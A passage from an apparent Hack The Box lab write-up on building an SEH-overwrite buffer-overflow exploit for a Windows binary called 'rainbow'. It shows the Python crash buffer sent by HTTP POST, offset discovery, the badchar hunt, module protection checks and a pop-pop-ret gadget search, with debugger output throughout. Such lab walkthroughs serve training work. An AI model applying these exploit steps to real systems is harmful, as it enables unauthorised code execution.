<span class="n">buf</span> <span class="o">+=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">][:</span><span class="mh">0xf00</span><span class="p">]</span>
</code></pre></div><p></p>
<p>Called like:
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">2</span><span class="w"> </span>~/htb/machines/rainbow<span class="o">]</span>
└─$<span class="w"> </span>./poc.py<span class="w"> </span><span class="m">192</span>.168.56.100:8080<span class="w"> </span><span class="k">$(</span>msf-pattern_create<span class="w"> </span>-l<span class="w"> </span>0x0f00<span class="k">)</span>
</code></pre></div><p></p>
<p>Identify the pattern found in the exception stack:
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>!exchain
009cfbe4:<span class="w"> </span><span class="m">77413177</span>
Invalid<span class="w"> </span>exception<span class="w"> </span>stack<span class="w"> </span>at<span class="w"> </span><span class="m">41307741</span>
</code></pre></div><p></p>
<p>Identify the offset
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">2</span><span class="w"> </span>~/htb/machines/rainbow<span class="o">]</span>
└─$<span class="w"> </span>msf-pattern_offset<span class="w"> </span>-l<span class="w"> </span>0x0f00<span class="w"> </span>-q<span class="w"> </span><span class="m">77413177</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Exact<span class="w"> </span>match<span class="w"> </span>at<span class="w"> </span>offset<span class="w"> </span><span class="m">664</span>
</code></pre></div><p></p>
<p>Buffer be like
</p><div class="highlight"><pre><span></span><code>    <span class="n">total_len</span> <span class="o">=</span> <span class="mi">3908</span>
    <span class="n">crash_len</span> <span class="o">=</span> <span class="mi">664</span>
    <span class="n">head</span> <span class="o">=</span> <span class="s2">"POST / HTTP/1.1</span><span class="se">\x0d\x0a</span><span class="s2">Content-Type: application/x-www-form-urlencoded</span><span class="se">\x0d\x0a\x0d\x0a</span><span class="s2">"</span>
    <span class="n">sled1</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x40</span><span class="s2">"</span> <span class="o">*</span> <span class="n">crash_len</span><span class="p">)</span>
    <span class="n">SEH</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x41</span><span class="s2">"</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span>
    <span class="n">tail</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x42</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_len</span> <span class="o">-</span> <span class="nb">sum</span><span class="p">([</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span>
        <span class="n">head</span><span class="p">,</span>
        <span class="n">sled1</span><span class="p">,</span>
        <span class="n">SEH</span>
    <span class="p">]])))</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">head</span><span class="si">}{</span><span class="n">sled1</span><span class="si">}{</span><span class="n">SEH</span><span class="si">}{</span><span class="n">tail</span><span class="si">}</span><span class="s2">"</span>
</code></pre></div><p></p>
<p>Now I am aligned
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>!exchain
009dfbe4:<span class="w"> </span><span class="m">41414141</span>
Invalid<span class="w"> </span>exception<span class="w"> </span>stack<span class="w"> </span>at<span class="w"> </span><span class="m">40404040</span>
</code></pre></div><p></p>
<h1 id="finding-badchars">Finding Badchars<a class="headerlink" href="#finding-badchars" title="Permanent link">¶</a></h1>
<p>Real quick though, test for badchars.  I have a function I built for that:</p>
<div class="highlight"><pre><span></span><code><span class="n">badchars</span> <span class="o">=</span> <span class="s2">""</span>
<span class="k">def</span><span class="w"> </span><span class="nf">gen_badchars</span><span class="p">(</span><span class="n">bc</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="s2">"</span><span class="se">\x01</span><span class="s2">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span><span class="p">):</span>
    <span class="n">s_int</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
    <span class="n">e_int</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">end</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
    <span class="n">BC</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">s_int</span><span class="p">,</span><span class="n">e_int</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">bc</span><span class="p">:</span>
        <span class="n">BC</span> <span class="o">=</span> <span class="n">BC</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">item</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">BC</span>
</code></pre></div>
<p>I use the above function and variable for massaging out badchars, by creating a string containing all bytes within a certain range.  I typically just start out with null to -1 as the range, but sometime I'd know beforehand about certain badchars, in this case I have no clue. </p>
<div class="highlight"><pre><span></span><code>    <span class="n">total_len</span> <span class="o">=</span> <span class="mi">3908</span>
    <span class="n">crash_len</span> <span class="o">=</span> <span class="mi">664</span>
    <span class="n">head</span> <span class="o">=</span> <span class="s2">"POST / HTTP/1.1</span><span class="se">\x0d\x0a</span><span class="s2">Content-Type: application/x-www-form-urlencoded</span><span class="se">\x0d\x0a\x0d\x0a</span><span class="s2">"</span>
    <span class="n">sled1</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x40</span><span class="s2">"</span> <span class="o">*</span> <span class="n">crash_len</span><span class="p">)</span>
    <span class="n">SEH</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x41</span><span class="s2">"</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span>
    <span class="n">bad</span> <span class="o">=</span> <span class="n">gen_badchars</span><span class="p">(</span><span class="n">badchars</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span><span class="p">)</span>
    <span class="n">tail</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x42</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_len</span> <span class="o">-</span> <span class="nb">sum</span><span class="p">([</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span>
        <span class="n">head</span><span class="p">,</span>
        <span class="n">sled1</span><span class="p">,</span>
        <span class="n">SEH</span><span class="p">,</span>
        <span class="n">bad</span>
    <span class="p">]])))</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">head</span><span class="si">}{</span><span class="n">sled1</span><span class="si">}{</span><span class="n">SEH</span><span class="si">}{</span><span class="n">bad</span><span class="si">}{</span><span class="n">tail</span><span class="si">}</span><span class="s2">"</span>
</code></pre></div>
<p>Null is for sure bad. 
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>!exchain
009ff8e4:<span class="w"> </span>rainbow+a040<span class="w"> </span><span class="o">(</span>0040a040<span class="o">)</span>
009ff924:<span class="w"> </span>rainbow+a040<span class="w"> </span><span class="o">(</span>0040a040<span class="o">)</span>
009ffbe4:<span class="w"> </span><span class="m">41414141</span>
Invalid<span class="w"> </span>exception<span class="w"> </span>stack<span class="w"> </span>at<span class="w"> </span><span class="m">40404040</span>
<span class="m">0</span>:003&gt;<span class="w"> </span>db<span class="w"> </span>0x009ffbe4<span class="w"> </span>L0n256
009ffbe4<span class="w">  </span><span class="m">40</span><span class="w"> </span><span class="m">40</span><span class="w"> </span><span class="m">40</span><span class="w"> </span><span class="m">40</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-05<span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span>f0<span class="w"> </span>fe<span class="w"> </span>9f<span class="w"> </span><span class="m">00</span><span class="w">  </span>@@@@AAAA........
009ffbf4<span class="w">  </span>b3<span class="w"> </span><span class="m">26</span><span class="w"> </span><span class="m">40</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">60</span><span class="w"> </span>6d<span class="w"> </span><span class="m">00</span>-b8<span class="w"> </span><span class="m">60</span><span class="w"> </span>6d<span class="w"> </span><span class="m">00</span><span class="w"> </span>b8<span class="w"> </span><span class="m">60</span><span class="w"> </span>6d<span class="w"> </span><span class="m">00</span><span class="w">  </span>.<span class="p">&amp;</span>@.<span class="o">(</span><span class="sb">`</span>m..<span class="sb">`</span>m..<span class="sb">`</span>m
</code></pre></div><p></p>
<p>So I add <code>\x00</code> to the badchars var above the <code>gen_badchars</code> function, rinse and repeat.</p>
<p>This time I had to go hunting for it a little bit, alignment was thrown off.
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>db<span class="w"> </span>0x00a0fbe4-0x2b0<span class="w"> </span>L0n280
00a0f934<span class="w">  </span>a3<span class="w"> </span>2b<span class="w"> </span><span class="m">40</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">50</span><span class="w"> </span>f9<span class="w"> </span>a0<span class="w"> </span><span class="m">00</span>-b8<span class="w"> </span>b3<span class="w"> </span><span class="m">40</span><span class="w"> </span><span class="m">00</span><span class="w"> </span>b8<span class="w"> </span>8c<span class="w"> </span><span class="m">62</span><span class="w"> </span><span class="m">00</span><span class="w">  </span>.+@.P.....@...b.
00a0f944<span class="w">  </span><span class="m">10</span><span class="w"> </span>3d<span class="w"> </span><span class="m">61</span><span class="w"> </span><span class="m">00</span><span class="w"> </span>c0<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">40</span><span class="w"> </span><span class="m">00</span>-10<span class="w"> </span>3d<span class="w"> </span><span class="m">61</span><span class="w"> </span><span class="m">00</span><span class="w"> </span>0b<span class="w"> </span>0c<span class="w"> </span>0d<span class="w"> </span>0e<span class="w">  </span>.<span class="o">=</span>a..<span class="w"> </span>@..<span class="o">=</span>a.....
00a0f954<span class="w">  </span>0f<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">13</span><span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">16</span>-17<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">19</span><span class="w"> </span>1a<span class="w"> </span>1b<span class="w"> </span>1c<span class="w"> </span>1d<span class="w"> </span>1e<span class="w">  </span>................
00a0f964<span class="w">  </span>1f<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">21</span><span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">26</span>-27<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">29</span><span class="w"> </span>2a<span class="w"> </span>2b<span class="w"> </span>2c<span class="w"> </span>2d<span class="w"> </span>2e<span class="w">  </span>.<span class="w"> </span>!<span class="s2">"#</span>$<span class="s2">%&amp;'()*+,-.</span>
<span class="s2">00a0f974  2f 30 31 32 33 34 35 36-37 38 39 3a 3b 3c 3d 3e  /0123456789:;&lt;=&gt;</span>
<span class="s2">00a0f984  3f 40 41 42 43 44 45 46-47 48 49 4a 4b 4c 4d 4e  ?@ABCDEFGHIJKLMN</span>
<span class="s2">00a0f994  4f 50 51 52 53 54 55 56-57 58 59 5a 5b 5c 5d 5e  OPQRSTUVWXYZ[\]^</span>
<span class="s2">00a0f9a4  5f 60 61 62 63 64 65 66-67 68 69 6a 6b 6c 6d 6e  _`abcdefghijklmn</span>
<span class="s2">00a0f9b4  6f 70 71 72 73 74 75 76-77 78 79 7a 7b 7c 7d 7e  opqrstuvwxyz{|}~</span>
<span class="s2">00a0f9c4  7f 80 81 82 83 84 85 86-87 88 89 8a 8b 8c 8d 8e  ................</span>
<span class="s2">00a0f9d4  8f 90 91 92 93 94 95 96-97 98 99 9a 9b 9c 9d 9e  ................</span>
<span class="s2">00a0f9e4  9f a0 a1 a2 a3 a4 a5 a6-a7 a8 a9 aa ab ac ad ae  ................</span>
<span class="s2">00a0f9f4  af b0 b1 b2 b3 b4 b5 b6-b7 b8 b9 ba bb bc bd be  ................</span>
<span class="s2">00a0fa04  bf c0 c1 c2 c3 c4 c5 c6-c7 c8 c9 ca cb cc cd ce  ................</span>
<span class="s2">00a0fa14  cf d0 d1 d2 d3 d4 d5 d6-d7 d8 d9 da db dc dd de  ................</span>
<span class="s2">00a0fa24  df e0 e1 e2 e3 e4 e5 e6-e7 e8 e9 ea eb ec ed ee  ................</span>
<span class="s2">00a0fa34  ef f0 f1 f2 f3 f4 f5 f6-f7 f8 f9 fa fb fc fd fe  ................</span>
<span class="s2">00a0fa44  ff 42 42 42 42 42 42 42                          .BBBBBBB</span>
</code></pre></div><p></p>
<p>This is a hard one to decipher, because of the way the rest of the badchars came back afterwards, and they were found way out of alignment.  But I think <code>\x0a</code> is a badchar.  So adding it.</p>
<p>Yes, that was correct.  All is well now
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>!exchain
00a1fbe4:<span class="w"> </span><span class="m">41414141</span>
Invalid<span class="w"> </span>exception<span class="w"> </span>stack<span class="w"> </span>at<span class="w"> </span><span class="m">40404040</span>
<span class="m">0</span>:003&gt;<span class="w"> </span>db<span class="w"> </span>0x00a1fbe4<span class="w"> </span>L0x256
00a1fbe4<span class="w">  </span><span class="m">40</span><span class="w"> </span><span class="m">40</span><span class="w"> </span><span class="m">40</span><span class="w"> </span><span class="m">40</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-01<span class="w"> </span><span class="m">02</span><span class="w"> </span><span class="m">03</span><span class="w"> </span><span class="m">04</span><span class="w"> </span><span class="m">05</span><span class="w"> </span><span class="m">06</span><span class="w"> </span><span class="m">07</span><span class="w"> </span><span class="m">08</span><span class="w">  </span>@@@@AAAA........
00a1fbf4<span class="w">  </span><span class="m">09</span><span class="w"> </span>0b<span class="w"> </span>0c<span class="w"> </span>0d<span class="w"> </span>0e<span class="w"> </span>0f<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">11</span>-12<span class="w"> </span><span class="m">13</span><span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">16</span><span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">19</span><span class="w">  </span>................
00a1fc04<span class="w">  </span>1a<span class="w"> </span>1b<span class="w"> </span>1c<span class="w"> </span>1d<span class="w"> </span>1e<span class="w"> </span>1f<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">21</span>-22<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">26</span><span class="w"> </span><span class="m">27</span><span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">29</span><span class="w">  </span>......<span class="w"> </span>!<span class="s2">"#</span>$<span class="s2">%&amp;'()</span>
<span class="s2">00a1fc14  2a 2b 2c 2d 2e 2f 30 31-32 33 34 35 36 37 38 39  *+,-./0123456789</span>
<span class="s2">00a1fc24  3a 3b 3c 3d 3e 3f 40 41-42 43 44 45 46 47 48 49  :;&lt;=&gt;?@ABCDEFGHI</span>
<span class="s2">00a1fc34  4a 4b 4c 4d 4e 4f 50 51-52 53 54 55 56 57 58 59  JKLMNOPQRSTUVWXY</span>
<span class="s2">00a1fc44  5a 5b 5c 5d 5e 5f 60 61-62 63 64 65 66 67 68 69  Z[\]^_`abcdefghi</span>
<span class="s2">00a1fc54  6a 6b 6c 6d 6e 6f 70 71-72 73 74 75 76 77 78 79  jklmnopqrstuvwxy</span>
<span class="s2">00a1fc64  7a 7b 7c 7d 7e 7f 80 81-82 83 84 85 86 87 88 89  z{|}~...........</span>
<span class="s2">00a1fc74  8a 8b 8c 8d 8e 8f 90 91-92 93 94 95 96 97 98 99  ................</span>
<span class="s2">00a1fc84  9a 9b 9c 9d 9e 9f a0 a1-a2 a3 a4 a5 a6 a7 a8 a9  ................</span>
<span class="s2">00a1fc94  aa ab ac ad ae af b0 b1-b2 b3 b4 b5 b6 b7 b8 b9  ................</span>
<span class="s2">00a1fca4  ba bb bc bd be bf c0 c1-c2 c3 c4 c5 c6 c7 c8 c9  ................</span>
<span class="s2">00a1fcb4  ca cb cc cd ce cf d0 d1-d2 d3 d4 d5 d6 d7 d8 d9  ................</span>
<span class="s2">00a1fcc4  da db dc dd de df e0 e1-e2 e3 e4 e5 e6 e7 e8 e9  ................</span>
<span class="s2">00a1fcd4  ea eb ec ed ee ef f0 f1-f2 f3 f4 f5 f6 f7 f8 f9  ................</span>
<span class="s2">00a1fce4  fa fb fc fd fe ff 42 42-42 42 42 42 42 42 42 42  ......BBBBBBBBBB</span>
</code></pre></div><p></p>
<p>Final badcchars:
</p><div class="highlight"><pre><span></span><code><span class="n">badchars</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x00\x0a</span><span class="s2">"</span>
</code></pre></div><p></p>
<p>Nothing uses the variable beyond hunting for badchars.</p>
<h1 id="finding-poppopret">Finding PopPopRet<a class="headerlink" href="#finding-poppopret" title="Permanent link">¶</a></h1>
<p>Of note, only the rainbow binary will do.  Everything else has DEP and ASLR enabled, and, why fight them if you don't have to.
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>!load<span class="w"> </span>narly

<span class="w">      </span>__s<span class="p">|</span>I<span class="o">}</span>*!<span class="o">{</span>a.<span class="w">                        </span>._s,aan2*a
<span class="w">     </span>_wY1+~-<span class="w">    </span><span class="o">)</span>S,<span class="w">                     </span>.ae<span class="s2">"~=:...:X</span>
<span class="s2">   .vXl+:.       -4c                   &lt;2+=|==::..:d</span>
<span class="s2">   vvi=;..        -?o,                =2=+==:::...=d</span>
<span class="s2">  )nv=:.            )5,              .2=--.......-=d</span>
<span class="s2">  ue+::              -*s             &lt;c .        .=d</span>
<span class="s2">  m&gt;==::..     ._,     &lt;s,           )c           :d</span>
<span class="s2">  #==viii|===; {Xs=,    -{s          )c         ..:d</span>
<span class="s2">  Z;{nnonnvvii;v(-{%=.    ~s,        )e:====||iiv%=d</span>
<span class="s2">  X={oooonvvIl;3;  -{%,    -*&gt;       )2&lt;onnnnvnnnn&gt;d</span>
<span class="s2">  X=)vvvvIliii:3;    -!s.   :)s.     )e&lt;oonvlllllIid</span>
<span class="s2">  X=&lt;lllliii|=:n;      -1c.  +|1,    )z&lt;nvii||+|+|vX</span>
<span class="s2">  S=&lt;lli|||=:: n;        "</span>nc<span class="w">  </span>-s%<span class="p">;</span><span class="w">   </span><span class="o">)</span><span class="nv">c</span><span class="o">=</span>ovl<span class="p">|</span>++<span class="o">==</span>+<span class="o">=</span>vo
<span class="w">  </span><span class="nv">X</span><span class="o">=</span>&lt;i<span class="o">||</span>+<span class="o">=</span><span class="p">;</span><span class="w"> </span>.<span class="w"> </span>.n<span class="sb">`</span><span class="w">          </span><span class="s2">"1&gt;.-{%i. )c&lt;Xnnli||++=vn</span>
<span class="s2">  X=iii&gt;==-.  :o`            "</span><span class="m">1</span>,:+iI,<span class="o">)</span>c:Sonnvli<span class="o">||=</span>v<span class="o">(</span>
<span class="w">  </span>X&gt;<span class="o">{</span>ii+<span class="p">;</span>:-<span class="w">  </span>.u<span class="o">(</span><span class="w">               </span><span class="s2">"o,-{Iw(:nvvvllii=v2</span>
<span class="s2">  S=i||;:. .=u(                 -!o,+I(:iiillii|ie`</span>
<span class="s2">  2&gt;v|==__su?`                    -?o,-:==||iisv"</span>
<span class="w">  </span><span class="o">{</span>nvnI!<span class="s2">""</span>~<span class="w">                         </span>-!sasvv<span class="o">}</span><span class="s2">""</span><span class="sb">`</span>

<span class="w">             </span>by<span class="w"> </span>Nephi<span class="w"> </span>Johnson<span class="w"> </span><span class="o">(</span>d0c_s4vage<span class="o">)</span>
<span class="w">                      </span>N<span class="w"> </span><span class="k">for</span><span class="w"> </span>gnarly!

Available<span class="w"> </span>commands:

<span class="w">    </span>!nmod<span class="w">     </span>-<span class="w"> </span>display<span class="w"> </span>/SafeSEH,<span class="w"> </span>/GS,<span class="w"> </span>DEP,<span class="w"> </span>and<span class="w"> </span>ASLR<span class="w"> </span>info<span class="w"> </span><span class="k">for</span>
<span class="w">                </span>all<span class="w"> </span>loaded<span class="w"> </span>modules

<span class="m">0</span>:003&gt;<span class="w"> </span>!nmod
<span class="m">00400000</span><span class="w"> </span><span class="m">00411000</span><span class="w"> </span>rainbow<span class="w">              </span>/SafeSEH<span class="w"> </span>OFF<span class="w"> </span>/GS<span class="w">            </span>c:<span class="se">\r</span>ainbow<span class="se">\r</span>ainbow.exe
6f980000<span class="w"> </span>6f995000<span class="w"> </span>VCRUNTIME140<span class="w">         </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>YSTEM32<span class="se">\V</span>CRUNTIME140.dll
6f9a0000<span class="w"> </span>6fa0d000<span class="w"> </span>MSVCP140<span class="w">             </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>YSTEM32<span class="se">\M</span>SVCP140.dll
74e80000<span class="w"> </span>74e8f000<span class="w"> </span>kernel_appcore<span class="w">       </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ysWOW64<span class="se">\k</span>ernel.appcore.dll
74fc0000<span class="w"> </span><span class="m">75012000</span><span class="w"> </span>mswsock<span class="w">              </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\m</span>swsock.dll
753c0000<span class="w"> </span>7547f000<span class="w"> </span>msvcrt<span class="w">               </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ysWOW64<span class="se">\m</span>svcrt.dll
75f30000<span class="w"> </span>75fe9000<span class="w"> </span>RPCRT4<span class="w">               </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\R</span>PCRT4.dll
76b10000<span class="w"> </span>76d49000<span class="w"> </span>KERNELBASE<span class="w">           </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\K</span>ERNELBASE.dll
76f00000<span class="w"> </span><span class="m">77020000</span><span class="w"> </span>ucrtbase<span class="w">             </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\u</span>crtbase.dll
<span class="m">77050000</span><span class="w"> </span><span class="m">77140000</span><span class="w"> </span>KERNEL32<span class="w">             </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\K</span>ERNEL32.DLL
774a0000<span class="w"> </span><span class="m">77503000</span><span class="w"> </span>WS2_32<span class="w">               </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>S2_32.dll
<span class="m">77550000</span><span class="w"> </span>776f4000<span class="w"> </span>ntdll<span class="w">                </span>/SafeSEH<span class="w"> </span>ON<span class="w">  </span>/GS<span class="w"> </span>*ASLR<span class="w"> </span>*DEP<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>YSTEM32<span class="se">\n</span>tdll.dll

*DEP/*ASLR<span class="w"> </span>means<span class="w"> </span>that<span class="w"> </span>these<span class="w"> </span>modules<span class="w"> </span>are<span class="w"> </span>compatible<span class="w"> </span>with<span class="w"> </span>ASLR/DEP
</code></pre></div><p></p>
<p>Well with null byte being a bad character, and given the address space of the binary, that means the boundary for the buffer has to end after the third byte of SEH in order to get the address placed on the stack correctly, because the last byte of the address is always null.   The end of the string (zero-terminated) will have to be what places the null byte for the fourth and final byte.</p>
<p>Gadget hunt with a tool I built, that wraps around rp++. </p>
<p><a href="https://github.com/SYANiDE-/rp-ng">https://github.com/SYANiDE-/rp-ng</a></p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/rainbow<span class="o">]</span>
└─$<span class="w"> </span>rp++-ng<span class="w"> </span>--va<span class="w"> </span>0x00400000<span class="w"> </span>--file<span class="w"> </span>dump/rainbow.exe<span class="w"> </span>-r<span class="w"> </span><span class="m">3</span><span class="w"> </span>--regex<span class="w"> </span><span class="s2">"pop.*pop.*ret"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null

<span class="w">  </span>rp++-ng?<span class="w">                           </span>^^<span class="w">           </span>
<span class="w">            </span>_________<span class="w"> </span>_________<span class="w">      </span>___<span class="w"> </span>__<span class="w">  </span>__________<span class="w"> </span><span class="sb">`</span>
<span class="w">   </span>.<span class="w">       </span><span class="p">|</span><span class="w">    </span>_o___<span class="p">|</span><span class="w">    </span>_o___<span class="w"> </span>++-<span class="w"> </span><span class="p">|</span><span class="w">   </span><span class="se">\ </span><span class="w"> </span><span class="p">|</span>/<span class="w">   </span>/_____/<span class="w">  </span>!
<span class="w">          </span><span class="p">|</span>___<span class="p">|</span><span class="se">\_</span>___<span class="p">|</span>___<span class="p">|</span>%%%%%<span class="w">     </span><span class="p">|</span>____<span class="se">\_</span><span class="p">|</span><span class="se">\_</span>__<span class="se">\_</span>___.<span class="o">]</span><span class="w"> </span>
<span class="w">  </span>z<span class="w">        </span><span class="sb">`</span>BB<span class="s1">' `BBB'</span><span class="sb">`</span>B<span class="s1">'           `BBBBBBB'</span><span class="w"> </span><span class="sb">`</span>BBBBBBBB<span class="err">'</span><span class="w"> </span>
<span class="w">     </span><span class="p">;</span><span class="w">                                    </span>Chain<span class="w"> </span>faster
<span class="w">              </span><span class="o">[[</span><span class="w">                            </span><span class="nv">$$$$</span>$<span class="w"> </span><span class="nv">$$$$$$</span><span class="w">      </span>i
<span class="w">                    </span>+<span class="w">                                    </span>SYANiDE


0x4092ad:<span class="w"> </span>pop<span class="w"> </span>ecx<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>ebp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x4094d8:<span class="w"> </span>pop<span class="w"> </span>ecx<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>ecx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x409adc:<span class="w"> </span>pop<span class="w"> </span>edi<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>esi<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x409b08:<span class="w"> </span>pop<span class="w"> </span>edi<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>esi<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
0x4091b7:<span class="w"> </span>pop<span class="w"> </span>edi<span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>esi<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret<span class="w"> </span><span class="p">;</span><span class="w"> </span>
